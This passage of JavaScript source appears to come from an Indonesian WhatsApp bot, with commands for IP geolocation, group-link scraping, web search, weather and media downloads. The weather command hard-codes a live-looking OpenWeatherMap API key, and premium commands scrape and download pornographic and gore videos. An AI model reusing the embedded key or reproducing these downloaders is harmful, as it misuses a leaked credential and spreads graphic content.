• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
  - Image: ${info.flag?.img || 'N/A'}
  - Emoji: ${info.flag?.emoji || 'N/A'}
  - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
  - ASN: ${info.connection?.asn || 'N/A'}
  - Organization: ${info.connection?.org || 'N/A'}
  - ISP: ${info.connection?.isp || 'N/A'}
  - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
  - ID: ${info.timezone?.id || 'N/A'}
  - Abbreviation: ${info.timezone?.abbr || 'N/A'}
  - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
  - Offset: ${info.timezone?.offset || 'N/A'}
  - UTC: ${info.timezone?.utc || 'N/A'}
  - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
        };

        if (!res.success) throw new Error(`IP ${text} not found!`);
        
        await lilychan.sendMessage(m.chat, { 
            location: { 
                degreesLatitude: res.latitude, 
                degreesLongitude: res.longitude 
            } 
        }, { ephemeralExpiration: 604800 });
        
        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        await delay(2000);
        
        m.reply(formatIPInfo(res));  
    } catch (e) { 
        m.reply(`Error: Unable to retrieve data for IP ${text}`);
    }
}
break;
case 'grupsearch': {
    if (!text) return m.reply('Masukkan query pencarian, misalnya: grupsearch india');

    const cheerio = require('cheerio');
    const axios = require('axios');

    async function grupnyohh(url) {
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const links = [];

            $('a.entry-image-link').each((index, element) => {
                const href = $(element).attr('href');
                if (href) {
                    links.push(href);
                }
            });

            return links;
        } catch (error) {
            console.error('Error fetching the page:', error);
            return [];
        }
    }

    async function urllgrupnyohh(url) {
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const links = [];
            let counter = 1;

            $('a[href*="chat.whatsapp.com"]').each((index, element) => {
                const href = $(element).attr('href');
                if (href) {
                    links.push(`${counter}). ${href}`);
                    counter++;
                }
            });

            return links.length > 0 ? links.join('\n') : 'Tidak ada link WhatsApp.';
        } catch (error) {
            console.error('Error fetching the page:', error);
            return 'Error.';
        }
    }

    const query = text.trim();
    const searchUrl = `https://whatsgrouplink.com/?s=${encodeURIComponent(query)}`;

    grupnyohh(searchUrl).then(async links => {
        if (links.length > 0) {
            const randomLink = links[Math.floor(Math.random() * links.length)];
            const result = await urllgrupnyohh(randomLink);
            m.reply(`Link Source Yang Dipilih: ${randomLink}\n\nLink grup WhatsApp yang ditemukan:\n${result}`);
        } else {
            m.reply('Tidak ada link yang ditemukan.');
        }
    }).catch(error => {
        console.error('Error:', error);
        m.reply('Terjadi kesalahan 404 Errrrr Rrorr');
    });
}
break;
case 'cerpen': {
    async function cerpen(category) {
        const axios = require('axios');
        const cheerio = require('cheerio');

        return new Promise(async (resolve, reject) => {
            let title = category.toLowerCase().replace(/[()*]/g, "");
            let judul = title.replace(/\s/g, "-");
            let page = Math.floor(Math.random() * 5);

            try {
                let get = await axios.get(`http://cerpenmu.com/category/cerpen-${judul}/page/${page}`);
                let $ = cheerio.load(get.data);
                let link = [];

                $('article.post').each(function (a, b) {
                    link.push($(b).find('a').attr('href'));
                });

                if (link.length === 0) {
                    // Tidak ada cerpen ditemukan
                    resolve({ error: 'Belum cerpen tersedia' });
                    return;
                }

                let random = link[Math.floor(Math.random() * link.length)];
                let res = await axios.get(random);
                let $$ = cheerio.load(res.data);

                // Mengecek apakah elemen yang diharapkan ada
                if ($$('#content > article > h1').length === 0) {
                    resolve({ error: 'Cerpen tidak ditemukan' });
                    return;
                }

                let hasil = {
                    title: $$('#content > article > h1').text(),
                    author: $$('#content > article').text().split('Cerpen Karangan: ')[1]?.split('Kategori: ')[0] || 'Unknown',
                    kategori: $$('#content > article').text().split('Kategori: ')[1]?.split('\n')[0] || 'Unknown',
                    lolos: $$('#content > article').text().split('Lolos moderasi pada: ')[1]?.split('\n')[0] || 'Unknown',
                    cerita: $$('#content > article > p').text() || 'Cerita tidak tersedia'
                };

                resolve(hasil);
            } catch (error) {
                // Tangani kesalahan yang mungkin terjadi
                if (error.response && error.response.status === 404) {
                    resolve({ error: 'Cerpen tidak ditemukan' });
                } else {
                    reject(error);
                }
            }
        });
    }

    // Pastikan text diisi dengan input judul
    if (!text) {
        return m.reply(`Masukan Kategori yang valid!!\n\nList Kategori :
Cerpen Anak
Cerpen Bahasa
Cerpen Bahasa Inggris
Cerpen Bahasa Jawa
Cerpen Bahasa Sunda
Cerpen Budaya
Cerpen Cinta
Cerpen Cinta Dalam Hati (Terpendam)
Cerpen Cinta Islami
Cerpen Cinta Pertama
Cerpen Cinta Romantis
Cerpen Cinta Sedih
Cerpen Cinta Segitiga
Cerpen Cinta Sejati
Cerpen Covid 19 (Corona)
Cerpen Dongeng (Cerita Rakyat)
Cerpen Fabel (Hewan)
Cerpen Fantasi (Fiksi)
Cerpen Fiksi Penggemar (Fanfiction)
Cerpen Galau
Cerpen Gokil
Cerpen Horor (Hantu)
Cerpen Inspiratif
Cerpen Islami (Religi)
Cerpen Jepang
Cerpen Kehidupan
Cerpen Keluarga
Cerpen Kisah Nyata
Cerpen Korea
Cerpen Kristen
Cerpen Liburan
Cerpen Lingkungan
Cerpen Lucu (Humor)
Cerpen Malaysia
Cerpen Mengharukan
Cerpen Misteri
Cerpen Motivasi
Cerpen Nasihat
Cerpen Nasionalisme
Cerpen Olahraga
Cerpen Patah Hati
Cerpen Penantian
Cerpen Pendidikan
Cerpen Pengalaman Pribadi
Cerpen Pengorbanan
Cerpen Penyesalan
Cerpen Perjuangan
Cerpen Perpisahan
Cerpen Persahabatan
Cerpen Petualangan
Cerpen Ramadhan
Cerpen Remaja
Cerpen Renungan
Cerpen Rindu
Cerpen Rohani
Cerpen Romantis
Cerpen Sastra
Cerpen Sedih
Cerpen Sejarah
Cerpen Slice Of Life
Cerpen Terjemahan
Cerpen Thriller (Aksi)`);
    }

    let cerpe = await cerpen(`${q}`);

    if (cerpe.error) {
        m.reply(cerpe.error);
    } else {
        m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`);
    }
}
break;
case 'cuaca':
case 'weather': {
    if (!text) return m.reply(`Example: ${prefix + command} jakarta`);

    try {
        let data = await fetchJson(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`);
        
        m.reply(`*🏙 Cuaca Kota ${data.name}*\n\n` +
                 `*🌤️ Cuaca :* ${data.weather[0].main}\n` +
                 `*📝 Deskripsi :* ${data.weather[0].description}\n` +
                 `*🌡️ Suhu Rata-rata :* ${data.main.temp} °C\n` +
                 `*🤔 Terasa Seperti :* ${data.main.feels_like} °C\n` +
                 `*🌬️ Tekanan :* ${data.main.pressure} hPa\n` +
                 `*💧 Kelembapan :* ${data.main.humidity}%\n` +
                 `*🌪️ Kecepatan Angin :* ${data.wind.speed} Km/h\n` +
                 `*📍 Lokasi :*\n` +
                 `- *Bujur :* ${data.coord.lat}\n` +
                 `- *Lintang :* ${data.coord.lon}\n` +
                 `*🌏 Negara :* ${data.sys.country}`);
    } catch (e) {
        m.reply('Kota Tidak Ditemukan!');
    }
}
break;

case 'yahoosearch': {
    if (!text) return m.reply(`Example : ${prefix + command} viral`);

    let axios = require('axios');
    let cheerio = require('cheerio');

    axios.get(`https://search.yahoo.com/search?p=${encodeURIComponent(text)}`)
        .then(response => {
            let $ = cheerio.load(response.data);
            let results = [];

            $('.dd.algo').each((i, elem) => {
                let title = $(elem).find('h3').text();
                let link = $(elem).find('a').attr('href');
                let snippet = $(elem).find('.compText').text();

                if (title && link) {
                    results.push({ title, link, snippet });
                }
            });

            if (results.length === 0) return m.reply('Tidak ada hasil.');

            let teks = `Yahoo Search From : ${text}\n\n`;
            for (let i = 0; i < Math.min(results.length, 5); i++) {
                let res = results[i];
                teks += `⭔ _Title_ : ${res.title}\n`;
                teks += `⭔ _Description_ : ${res.snippet}\n`;
                teks += `⭔ _Link_ : ${res.link}\n\n────────────────────────\n\n`;
            }
            m.reply(teks);
        })
        .catch(err => {
            m.reply('Terjadi kesalahan.');
            console.error(err);
        });
}
break;
case 'bingsearch': {
    if (!text) return m.reply(`Example : ${prefix + command} Rumah`);

    let axios = require('axios');
    let cheerio = require('cheerio');

    axios.get(`https://www.bing.com/search?q=${encodeURIComponent(text)}`)
        .then(response => {
            let $ = cheerio.load(response.data);
            let results = [];

            $('.b_algo').each((i, elem) => {
                let title = $(elem).find('h2').text();
                let link = $(elem).find('a').attr('href');
                let snippet = $(elem).find('.b_caption p').text();

                if (title && link) {
                    results.push({ title, link, snippet });
                }
            });

            if (results.length === 0) return m.reply('Gada apa di sini.');

            let teks = `Bing Search From : ${text}\n\n`;
            for (let i = 0; i < Math.min(results.length, 5); i++) {
                let res = results[i];
                teks += `⭔ *Title* : ${res.title}\n`;
                teks += `⭔ *Description* : ${res.snippet}\n`;
                teks += `⭔ *Link* : ${res.link}\n\n────────────────────────\n\n`;
            }
            m.reply(teks);
        })
        .catch(err => {
            m.reply('Terjadi kesalahan saat melakukan pencarian.');
            console.error(err);
        });
}
break;
case 'penerbit': {
    const jeson = await fetchJson('https://raw.githubusercontent.com/TanakaDomp/Database-Json/refs/heads/main/penerbit.json');
    var data = pickRandom(jeson);
    
    let mnk = `[ *PENERBIT* ]

Penerbit: ${data.penerbit}
No Anggota: ${data.no_anggota}
Wilayah: ${data.wilayah}
Tahun: ${data.tahun_masuk}
Anggota Luar Biasa: ${data.anggota_luar_biasa}
`;
    
    m.reply(mnk);
}
break;

case 'duckduckgosearch': {
    if (!text) return m.reply(`Example : ${prefix + command} Mia Khalifa`);

    let axios = require('axios');
    let cheerio = require('cheerio');

    axios.get(`https://duckduckgo.com/html/?q=${encodeURIComponent(text)}`)
        .then(response => {
            let $ = cheerio.load(response.data);
            let results = [];

            $('.result').each((i, elem) => {
                let title = $(elem).find('.result__title').text();
                let link = $(elem).find('.result__url').attr('href');
                let snippet = $(elem).find('.result__snippet').text();

                if (title && link) {
                    results.push({ title, link, snippet });
                }
            });

            if (results.length === 0) return m.reply('Tidak ada hasil.');

            let teks = `DuckDuckGo Search From : ${text}\n\n`;
            for (let i = 0; i < Math.min(results.length, 5); i++) {
                let res = results[i];
                teks += `⭔ _Title_ : ${res.title}\n`;
                teks += `⭔ _Description_ : ${res.snippet}\n`;
                teks += `⭔ _Link_ : https:${res.link}\n\n────────────────────────\n\n`;
            }
            m.reply(teks);
        })
        .catch(err => {
            m.reply('Terjadi kesalahan.');
            console.error(err);
        });
}
break;
case 'crypto': {
  if (!text) return m.reply(`Example : ${prefix + command} Bitcoin`);
    
    let axios = require('axios');
    
    axios.get(`https://api.coingecko.com/api/v3/coins/markets`, {
        params: {
            vs_currency: 'usd',
            ids: text.toLowerCase()
        }
    })
    .then(response => {
        if (response.data.length === 0) return m.reply('Tidak ada hasil.');
        
        let coin = response.data[0];
        let teks = `Crypto Info for: ${coin.name}\n\n`;
        teks += `⭔ _Symbol_ : ${coin.symbol.toUpperCase()}\n`;
        teks += `⭔ _Current Price_ : $${coin.current_price}\n`;
        teks += `⭔ _Market Cap_ : $${coin.market_cap}\n`;
        teks += `⭔ _24h High_ : $${coin.high_24h}\n`;
        teks += `⭔ _24h Low_ : $${coin.low_24h}\n`;
        teks += `⭔ _Price Change 24h_ : ${coin.price_change_percentage_24h}%\n`;
        teks += `⭔ _Last Updated_ : ${coin.last_updated}\n\n`;
        
        m.reply(teks);
    })
    .catch(err => {
        m.reply('Terjadi kesalahan.');
        console.error(err);
    });
}
break 
case 'ts':
case 'ttsearch': {
    if (!text) return m.reply(`• *Example :* .${command} jedag jedug`);
    
    lilychan.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
    
    let { tiktoks } = require("./lib/ttdl");
    let lily = await tiktoks(`${text}`);
    
     await lilychan.sendMessage(m.chat, {
        video: {
            url: lily.no_watermark
        },
        caption: lily.title,
    }, {
        quoted: m
    });
}
break;

case 'ttsound': {
    if (!text) return m.reply(`• *Example :* .${command} Angel Beats`);
    
    lilychan.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
    
    let { tiktoks } = require("./lib/ttdl");
    let yapit = await tiktoks(`${text}`);
    
    lilychan.sendMessage(m.chat, {
        audio: {
            url: yapit.no_watermark
        },
        mimetype: "audio/mpeg",
        ptt: true
    }, {
        quoted: m
    });
    
    lilychan.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break;
case 'lyrics':
case 'lirik': {
    async function songSearch(query) {
        try {
            const { data } = await axios.get("https://songsear.ch/q/" + query);
            const $ = cheerio.load(data);
            
            const result = {
                title: $("div.results > div:nth-child(1) > .head > h3 > b").text() +
                       " - " +
                       $("div.results > div:nth-child(1) > .head > h2 > a").text(),
                album: $("div.results > div:nth-child(1) > .head > p").text(),
                number: $("div.results > div:nth-child(1) > .head > a")
                    .attr("href")
                    .split("/")[4],
                thumb: $("div.results > div:nth-child(1) > .head > a > img").attr("src"),
            };

            const { data: lyricData } = await axios.get(
                `https://songsear.ch/api/song/${result.number}?text_only=true`
            );
            const lyrics = lyricData.song.text_html
                .replace(/<br\/>/g, "\n")
                .replace(/&#x27;/g, "'");

            return {
                status: true,
                title: result.title,
                album: result.album,
                thumb: result.thumb,
                lyrics: lyrics,
            };
        } catch (err) {
            console.log(err);
            return {
                status: false,
                error: "Unknown error occurred",
            };
        }
    }

    if (!args[0]) {
        return m.reply(`Input Pencarian\n\nExample : ${prefix + command} Pesan Terakhir`);
    }

    lilychan.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
    
    let src = await songSearch(text);
    
    let cap = `\`\`\`「 LIRIK SEARCH 」\`\`\`
    
> *Judul:* ${src.title}
> *Album:* ${src.album}

*Lirik:* ${src.lyrics}
`.trim();

    await lilychan.sendFile(m.chat, src.thumb, null, cap, m);
}
break;
case 'xnxxdl': {
    if (!isPremium) return m.reply(mess.prem);
    if (!args[0]) return m.reply(`Input Parameter Url Dari ${command}\n\nExample : ${prefix + command} Url`);

    m.reply('Waiting...');
    let data = await xnxxDownloader(text);
    
    let capp = `XNXX DL\nTitle : ${data.title}\nDurasi : ${data.duration}\nUrl : ${data.URL}\n`;
    
    await lilychan.sendMessage(m.chat, {
        video: {
            url: data.files.high
        },
        caption: capp,
    }, {
        quoted: m
    });
}
break;

case 'xnxxsearch': {
    if (!isPremium) return m.reply(mess.prem);
    if (!args[0]) return m.reply(`Tobat Woi\n\nExample : ${prefix + command} Japanese`);

    m.reply('Waiting...');
    let data = await xnxxSearch(text);
    let results = data.result;

    if (results.length > 0) {
        let message = `Hasil dari pencarian ${text} :\n\n`;
        results.forEach((result) => {
            message += `Title : ${result.title}\nInfo : ${result.info}\nLink : ${result.link}\n\n`;
        });
        m.reply(message);
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break;

case 'xnxxplay': {
    if (!isPremium) return m.reply(mess.prem);
    if (!args[0]) return m.reply(`Tobat Woi\n\nExample : ${prefix + command} Japanese`);

    m.reply('Waiting...');
    let data = await xnxxSearch(text);
    let lily = data.result;
    let ambil = lily[0].link;

    await sleep(4000);
    let dunlut = await xnxxDownloader(ambil);
    
    let teks = '乂 XNXX PLAY\n';
    teks += `⭔ _Title_ : ${dunlut.title}\n`;
    teks += `⭔ _Durasi_ : ${dunlut.duration}\n`;
    teks += `⭔ _Link_ : ${dunlut.URL}`;
    
    await lilychan.sendMessage(m.chat, {
        video: {
            url: dunlut.files.high
        },
        caption: teks,
    }, {
        quoted: m
    });
}
break;

case 'drakor': {
    if (!text) return m.reply(`${prefix + command} Train To Busan`);
    
    m.reply('Mencari informasi drama Korea...');
    
    try {
        const url = `https://mydramalist.com/search?q=${encodeURIComponent(text)}`;
        const response = await axios.get(url);
        const $ = cheerio.load(response.data);
        
        const judul = $('.title').first().text().trim();
        const konten = $('.content').first().find('p').map((i, el) => $(el).text().trim()).get().join('\n\n');
        const link = $('.title').first().find('a').attr('href');
        
        if (!konten) {
            throw new Error('Tidak Drakor Itu.');
        }

        const artikel = `*Judul:* ${judul}\n\n*Konten:* ${konten}\n\n*Link:* https://mydramalist.com${link}`;
        m.reply(artikel);
    } catch (error) {
        m.reply(`Maaf, terjadi kesalahan: ${error.message}`);
    }
}
break;
case 'goredl': {
    if (!isPremium) return m.reply(mess.prem);
    if (!text) return m.reply(`Example: ${prefix + command} Url`);

    async function sgoredl(link) {
        return new Promise(async (resolve, reject) => {
            axios.get(link)
                .then(({ data }) => {
                    const $$ = cheerio.load(data);
                    const format = {
                        judul: $$('div.single-main-container > div > div.bb-col.col-content > div > div > div > div > header > h1').text(),
                        views: $$('div.single-main-container > div > div.bb-col.col-content > div > div > div > div > div.s-post-meta-block.bb-mb-el > div > div > div.col-r.d-table-cell.col-md-6.col-sm-6.text-right-sm > div > span > span.count').text(),
                        comment: $$('div.single-main-container > div > div.bb-col.col-content > div > div > div > div > div.s-post-meta-block.bb-mb-el > div > div > div.col-r.d-table-cell.col-md-6.col-sm-6.text-right-sm > div > a > span.count').text(),
                        link: $$('video > source').attr('src')
                    };
                    const result = {
                        creator: "Wudysoft",
                        data: format
                    };
                    resolve(result);
                })
                .catch(reject);
        });
    }

    const gkanjut = await sgoredl(text);
    let pant = gkanjut.data;
    let ghann = `[ *SEEGORE DOWNOADER* ]

Judul: ${pant.judul}
Views: ${pant.views}
Comment: ${pant.comment}
Link: ${pant.link}
`;

    lilychan.sendMessage(m.chat, {
        video: { url: pant.link },
        caption: ghann
    }, {
        quoted: m
    });
}
break;

case 'goresearch': {
    if (!isPremium) return m.reply(mess.prem);
    if (!text) return m.reply("Example: .goresearch girl");

    async function ssearchgore(query) {
        return new Promise(async (resolve, reject) => {
            axios.get('https://seegore.com/?s=' + query)
                .then(dataa => {
                    const $$$ = cheerio.load(dataa);
                    let slink = 'https://seegore.com/?s=' + query;

                    axios.get(slink)
                        .then(({ data }) => {
                            const $ = cheerio.load(data);
                            const link = [];
                            const judul = [];
                            const uploader = [];
                            const format = [];
                            const thumb = [];

                            $('#post-items > li > article > div.content > header > h2 > a').each(function(a, b) {
                                link.push($(b).attr('href'));
                            });

                            $('#post-items > li > article > div.content > header > h2 > a').each(function(c, d) {
                                let jud = $(d).text();
                                judul.push(jud);
                            });

                            $('#post-items > li > article > div.content > header > div > div.bb-cat-links > a').each(function(e, f) {
                                let upl = $(f).text();
                                uploader.push(upl);
                            });

                            $('#post-items > li > article > div.post-thumbnail > a > div > img').each(function(g, h) {
                                thumb.push($(h).attr('src'));
                            });

                            for (let i = 0; i < link.length; i++) {
                                format.push({
                                    judul: judul[i],
                                    uploader: uploader[i],
                                    thumb: thumb[i],
                                    link: link[i]
                                });
                            }

                            const result = {
                                creator: "Wudysoft",
                                data: format
                            };
                            resolve(result);
                        })
                        .catch(reject);
                });
        });
    }

    try {
        let haiyak = await ssearchgore(text);
        let coba = haiyak.data;
        let goreng = '';

        for (const goree of coba) {
            goreng += `Judul: ${goree.judul}\nUploader: ${goree.uploader}\nLink: ${goree.link}\n\n`;
        }

        m.reply(goreng);
    } catch (e) {
        m.reply(e);
    }
}
break;
 case 'alosehat': {
  if (!q) return m.reply("Apa yang ingin dicari?");

  const fetch = require('node-fetch');
  const cheerio = require('cheerio');
  
  async function alosehat(query) {
    try {
      const url = `https://wp.hellosehat.com/?s=${encodeURIComponent(query)}`;
      const response = await fetch(url);
      
      if (!response.ok) {
        throw new Error(`${response.status}`);
      }
      
      const body = await response.text();
      const $ = cheerio.load(body);
      
      const articles = $(".card.article--card").map((index, element) => {
        const article = $(element);
        return {
          title: article.find("h2.entry-title a").text().trim(),
          link: article.find("h2.entry-title a").attr("href"),
          desc: article.find(".entry-summary p").text().trim(),
          author: article.find(".author.vcard a").text().trim(),
          time: article.find("time.entry-date.published").attr("datetime")
        };
      }).get().filter(article => article.title && article.desc);
      
      if (!articles.length) {
        throw new Error("No matching results found.");
      }
      
      const totalResults = parseInt($(".search--result-count").text(), 10) || 0;
      return { total: totalResults, results: articles };
      
    } catch (error) {
      throw new Error(`Error: ${error.message}`);
    }
  }

  try {
    const results = await alosehat(q);
    const { total, results: articles } = results;
    
    if (total === 0) {
      return m.reply("gd hsil.");
    }
    
    const response = articles.map((item, index) => (
      `${index + 1}. ${item.title}\nPenulis: ${item.author}\nTanggal: ${item.time}\nDeskripsi: ${item.desc}\nLink: ${item.link}\n\n`
    )).join('');

    m.reply(`Hasil pencarian Hello Sehat (${total} hasil):\n\n${response}`);
    
  } catch (error) {
    m.reply(`Terjadi kesalahan: ${error.message}`);
  }
}
break
case 'gimage': {
    if (!text) return m.reply(`Example : ${prefix + command} carry minati`);

    let gis = require('g-i-s');
    gis(text, async (error, result) => {
        if (error) {
            return m.reply('Terjadi kesalahan saat mencari gambar.');
        }

        const n = result;
        const images = n[Math.floor(Math.random() * n.length)].url;

        await lilychan.sendMessage(m.chat, {
            image: { url: images },
            caption: `*Query* : ${text}\n*Media Url* : ${images}`
        }, { quoted: m });
    });
}
break;

case 'unsplash': {
    if (!text) return m.reply('Masukan Query!!');

    const url = `https://unsplash.com/s/photos/${encodeURIComponent(text)}`;
    try {
        const { data } = await axios.get(url);
        const $ = cheerio.load(data);
        const imageUrls = [];

        $('img[src^="https://images.unsplash.com"]').each((index, element) => {
            const imgUrl = $(element).attr('src');
            if (imgUrl && imgUrl.startsWith('http')) {
                imageUrls.push(imgUrl);
            }
        });

        if (imageUrls.length > 0) {
            const limitedUrls = imageUrls.slice(0, 5);
            const formattedUrls = limitedUrls.map((url, index) => `${index + 1})\n> ${url}`).join('\n\n');
            const gambar = pickRandom(limitedUrls);
            let cap = `Berikut adalah hasil dari pencarian: ${text}\n\n${formattedUrls}`;

            await lilychan.sendMessage(m.chat, {
                image: { url: gambar },
                caption: cap
            }, { quoted: m });
        } else {
            m.reply('Tidak ada gambar');
        }
    } catch (error) {
        console.error(error);
        m.reply('Terjadi kesalahan');
    }
}
break;

case 'tr':
case 'translate': {
    let translate = require('translate-google-api');
    let defaultLang = 'en';
    let tld = 'cn';
    let toks = `
Contoh:
${prefix + command} <lang> [text]
${prefix + command} id your messages
Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
`.trim();

    let lang = args[0];
    let text = args.slice(1).join(' ');

    if ((args[0] || '').length !== 2) {
        lang = defaultLang;
        text = args.join(' ');
    }

    if (!text && m.quoted && m.quoted.text) {
        text = m.quoted.text;
    }

    let result;
    try {
        result = await translate(`${text}`, { to: lang });
    } catch (e) {
        result = await translate(`${text}`, { to: defaultLang });
        m.reply(toks);
    } finally {
        m.reply(result[0]);
    }
}
break;
case 'npms': {
    if (!text) return m.reply('Input Query');

    let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`);
    let { objects } = await res.json();

    if (!objects.length) throw `Query "${text}" not found :/`;

    let txt = objects.map(({ package: pkg }) => {
        return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`;
    }).join('\n\n');

    m.reply(txt);
}
break;

case 'pinterest':
case 'pin': {
    if (!text) return m.reply(`Example : ${prefix + command} Cat | 5`);

    const tanaka = text.split("|")[0];
    const sensei = text.split("|")[1];

    await m.reply('```Loading search```');

    async function createImage(url) {
        const { imageMessage } = await generateWAMessageContent({
            image: { url }
        }, {
            upload: lilychan.waUploadToServer
        });
        return imageMessage;
    }

    let push = [];
    let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${tanaka}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${tanaka}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);

    let res = data.resource_response.data.results.map(v => v.images.orig.url);
    let ult = res.splice(0, sensei || 4);
    let i = 1;

    for (let pus of ult) {
        push.push({
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: ``
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: `> Results : ${i++}`
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: ``,
                hasMediaAttachment: true,
                imageMessage: await createImage(pus)
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: []
            })
        });
    }

    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: ``
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: ``
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: [...push]
                    })
                })
            }
        }
    }, { quoted: m });

    await lilychan.relayMessage(m.chat, msg.message, {
        messageId: msg.key.id
    });
}
break;
case 'wallpaper': {
    async function wallpaper(title, page = '1') {
        return new Promise(async (resolve, reject) => {
            try {
                const { data } = await axios.get(`https://www.besthdwallpaper.com/search?CurrentPage=${page}&q=${title}`);
                const $ = cheerio.load(data);
                const hasil = [];

                $('div.grid-item').each(function (a, b) {
                    hasil.push({
                        title: $(b).find('div.info > p').attr('title'),
                        type: $(b).find('div.info > a:nth-child(2)').text(),
                        source: 'https://www.besthdwallpaper.com' + $(b).find('a').attr('href'),
                        image: [
                            $(b).find('picture > img').attr('data-src') || $(b).find('picture > img').attr('src'),
                            $(b).find('picture > source:nth-child(1)').attr('srcset'),
                            $(b).find('picture > source:nth-child(2)').attr('srcset')
                        ]
                    });
                });

                resolve(hasil);
            } catch (e) {
                reject(e);
            }
        });
    }

    try {
        if (!text) return m.reply('```Input query?```');
        
        let data = await wallpaper(text);
        let lily = pickRandom(data);
        m.reply(mess.wait);
        
        let gamber = pickRandom(lily.image);
        let cap = `   
> *Title:* ${lily.title}
> *Type:* ${lily.type}
> *Source:* ${lily.source}
`.trim();

        lilychan.sendMessage(m.chat, { image: { url: gamber }, caption: cap }, { quoted: m });
    } catch (e) {
        m.reply("Pencarian Gagal");
    }
}
break;

case 'konachan': {
    async function konachan(chara) {
        return new Promise((resolve, reject) => {
            let text = chara.replace(' ', '_');
            axios.get('https://konachan.net/post?tags=' + text + '+')
                .then(({ data }) => {
                    const $$ = cheerio.load(data);
                    const no = [];

                    $$('div.pagination > a').each(function (c, d) {
                        no.push($$(d).text());
                    });

                    let mat = Math.floor(Math.random() * no.length);
                    axios.get('https://konachan.net/post?page=' + mat + '&tags=' + text + '+')
                        .then(({ data }) => {
                            const $ = cheerio.load(data);
                            const result = [];

                            $('#post-list > div.content > div:nth-child(4) > ul > li > a.directlink.largeimg').each(function (a, b) {
                                result.push($(b).attr('href'));
                            });

                            resolve(result);
                        });
                })
                .catch(reject);
        });
    }

    if (!text) return m.reply(`Example : ${prefix + command} Naruto`);

    let push = [];
    for (let i = 0; i < 5; i++) {
        let hasile = await konachan(text);
        let ngawi = pickRandom(hasile);
        let tsst = await prepareWAMessageMedia({
            'image': { url: ngawi }
        }, {
            'upload': lilychan.waUploadToServer
        });

        push.push({
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: ``
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: `— S3NS31#404.`
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: ``,
                hasMediaAttachment: true,
                ...tsst
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: []
            })
        });
    }

    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: ``
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: ``
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: false
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: [...push]
                    })
                })
            }
        }
    }, { quoted: m });

    await lilychan.relayMessage(m.chat, msg.message, {
        messageId: msg.key.id
    });
}
break;

case 'kisahnabi': {
    if (!text) return m.reply(`Masukan nama nabi\nExample: kisahnabi adam`);

    let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`);
    let kisah = await url.json().catch(_ => "Error");

    if (kisah == "Error") return m.reply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital");

    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`;

    m.reply(hasil);
}
break;
case 'surah': {
    async function surah(no) {
        return new Promise(async (resolve, reject) => {
            axios.get('https://kalam.sindonews.com/surah/' + no)
                .then(({ data }) => {
                    const $ = cheerio.load(data);
                    const result = [];
                    const ar = [];
                    const id = [];
                    const lt = [];

